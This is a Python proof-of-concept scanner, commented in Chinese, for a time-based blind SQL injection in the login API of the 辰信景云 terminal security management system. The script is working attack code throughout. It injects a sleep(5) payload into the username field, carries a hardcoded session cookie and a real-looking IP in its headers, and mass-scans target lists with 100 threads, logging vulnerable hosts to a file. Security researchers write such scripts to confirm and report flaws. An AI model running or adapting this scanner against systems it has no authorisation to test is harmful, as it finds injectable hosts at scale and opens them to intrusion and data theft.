# 辰信景云终端安全管理系统 login存在 SQL注入漏洞
import argparse  # 导入argparse模块，用于处理命令行参数
import requests  # 导入requests模块，用于发送HTTP请求
import sys  # 导入sys模块，用于访问与Python解释器紧密相关的变量和函数
from multiprocessing.dummy import Pool  # 从dummy multiprocessing导入池，允许使用多线程
requests.packages.urllib3.disable_warnings()    # 禁用requests库的HTTPS警告


def banner():
    # 输出程序的介绍信息
    banner = '''  
 ██████╗██╗  ██╗     ██╗██╗   ██╗     ███████╗ ██████╗ ██╗     ██╗  
██╔════╝╚██╗██╔╝     ██║╚██╗ ██╔╝     ██╔════╝██╔═══██╗██║     ██║  
██║      ╚███╔╝      ██║ ╚████╔╝      ███████╗██║   ██║██║     ██║  
██║      ██╔██╗ ██   ██║  ╚██╔╝       ╚════██║██║▄▄ ██║██║     ██║  
╚██████╗██╔╝ ██╗╚█████╔╝   ██║███████╗███████║╚██████╔╝███████╗██║  
 ╚═════╝╚═╝  ╚═╝ ╚════╝    ╚═╝╚══════╝╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝  
                                   author:MOYV  
                                   date:2024/09/03  
                                   version:1.0  
'''
    print(banner)  # 打印横幅


def poc(target):
    # 漏洞检测的实现
    url = target + "/api/user/login"  # 构造用于登录的payload
    headers = {
        "Cookie": "vsecureSessionID=69e478ff4acadfb185c09154c3133085",
        "Content-Length": "102",
        "Sec-Ch-Ua": 'Chromium";v="128","Not;A=Brand";v="24","GoogleChrome";v="128"',
        "Accept": "application/json,text/javascript,*/*;q=0.01",
        "Sec-Ch-Ua-Platform": "Windows",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/128.0.0.0Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://106.55.100.76",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://106.55.100.76/?v=login",
        "Accept-Encoding": "gzip,deflate,br",
        "Accept-Language": "zh-CN,zh;q=0.9",
    }
    # SQL注入Payload，用于检测漏洞
    data = "captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='"

    try:
        # 发送GET请求到目标URL，检查其状态
        res1 = requests.get(url=target, verify=False)
        if res1.status_code == 200:  # 如果返回状态码为200即表示目标可以正常访问
            # 发送POST请求进行SQL注入测试
            res2 = requests.post(url=url, headers=headers, data=data, verify=False, timeout=10)
            # 检查响应时间是否大于5秒，判断是否存在SQL注入
            if res2.elapsed.total_seconds() >= 5:
                # 将结果记录到结果文件中
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{target}存在SQL注入\n")  # 记录存在漏洞的目标
                print(f"[+]{target}存在SQL注入")  # 在控制台输出结果
            else:
                print(f"[-]{target}不存在SQL注入")  # 输出目标不含漏洞的消息
    except Exception as e:
        # 处理可能发生的异常，输出错误信息
        print(f"[!]{target}可能存在问题，请手动检测")


def main():
    banner()  # 调用banner函数输出横幅
    # 创建命令行参数解析器
    parse = argparse.ArgumentParser(description="辰信景云终端安全管理系统_login_SQL注入漏洞脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")  # 添加URL参数
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")  # 添加文件参数
    args = parse.parse_args()  # 解析命令行参数

    # 根据用户输入的参数选择执行方式
    if args.url and not args.file:  # 当输入URL时
        poc(args.url)  # 进行单个URL的SQL注入检测
    elif not args.url and args.file:  # 当输入文件时
        url_list = []  # 初始化URL列表
        with open(args.file, "r", encoding='utf-8') as f:
            for url in f.readlines():  # 读取文件中的每一行
                url_list.append(url.strip().replace("\n", ""))  # 去掉换行符并添加到列表
        mp = Pool(100)  # 创建一个包含100个线程的线程池
        mp.map(poc, url_list)  # 并发执行SQL注入检测
        mp.close()  # 关闭线程池
        mp.join()  # 等待所有线程完成
    else:
        # 提示用户正确的用法
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

# 主程序入口
if __name__ == '__main__':
    main()  # 调用main函数